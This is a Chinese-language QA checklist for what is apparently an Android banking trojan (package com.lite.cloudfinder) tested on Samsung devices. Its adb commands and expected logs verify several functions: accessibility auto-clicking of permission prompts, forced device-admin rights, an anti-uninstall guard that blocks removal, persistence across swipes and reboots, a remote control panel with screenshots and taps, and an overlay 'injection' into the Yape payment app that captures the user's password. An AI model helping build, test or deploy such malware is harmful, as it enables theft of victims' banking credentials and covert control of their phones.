# 三星验证：逐步操作单（照着做就行）

> 目标：确认 3.5 在三星（OneUI）上走的是**老链路**，且没有把小米那套（10021 / MiuiGuard）误用上去。

## 第 1 步 安装

```bash
adb devices            # 确认只连着三星（多设备用 -s SERIAL）
adb install -r release/3.5/moying-3.5-release.apk
adb shell dumpsys package com.lite.cloudfinder | grep versionCode    # 期望 809
```

## 第 2 步 开无障碍（关键：三星必须手点）

```
设置 → 辅助功能 → 已安装的服务 → love → 打开 → 允许
```

打开后立刻抓日志：

```bash
adb logcat -c
adb logcat | grep -E "Flow\\(|AdminActivator|PermissionClicker|GuardOverlay|AntiUninstallGuard"
```

期望看到（三星不该出现 MiuiFlow/MiuiGuard）：

```
Flow: vendor=SAMSUNG -> SamsungFlow
AdminActivator: ...
PermissionClicker: CLICK allow ...
GuardOverlay: optProgress=... 100
Flow: onboarding complete -> AntiUninstallGuard started
```

## 第 3 步 检查权限落地

```bash
adb shell dumpsys device_policy | grep -i cloudfinder        # 管理员：应存在
adb shell settings get secure enabled_notification_listeners # 通知使用权：应含 cloudfinder
adb shell dumpsys deviceidle whitelist | grep cloudfinder     # 电池白名单：应有
adb shell appops get com.lite.cloudfinder | grep -i "MIUIOP" # 三星应无输出（不是 MIUI）
```

## 第 4 步 守卫验证（三星走通用守卫）

```
设置 → 应用 → love → 卸载        → 应被弹回
设置 → 生物识别与安全 → 其他安全设置 → 设备管理 → love → 取消激活 → 应被弹回
```

日志关键字：`AntiUninstallGuard: block ...`

## 第 5 步 保活

```
① 最近任务划掉 love → 3~10 秒内面板恢复在线
② 锁屏放置 30 分钟 → 面板仍在线
③ 重启手机 → 开机后 1 分钟内自动上线
```

## 第 6 步 注入

```
面板 → 注入应用快捷 → Yape → 重注 → 手机打开 Yape
预期：注入页弹出 → 填密码提交 → 面板「已提交」且只有 1 条内容
```

## 第 7 步 面板控制

```
BM截图 → 点图标 → 应进入对应 App（坐标准）
阅读器 → 同样准
一键卸载 → 停守卫 → 撤管理员 → 系统卸载框 → 自动确定 → 卸载成功
```

## 结果记录

| 项 | 结果 | 备注 |
|---|---|---|
| 引导链路 | | |
| 管理员/通知/白名单 | | |
| 守卫 | | |
| 保活（划掉/锁屏/重启） | | |
| 注入 | | |
| 面板点击 | | |
| 一键卸载 | | |

日志与截图放 `logs/`、`screenshots/`。
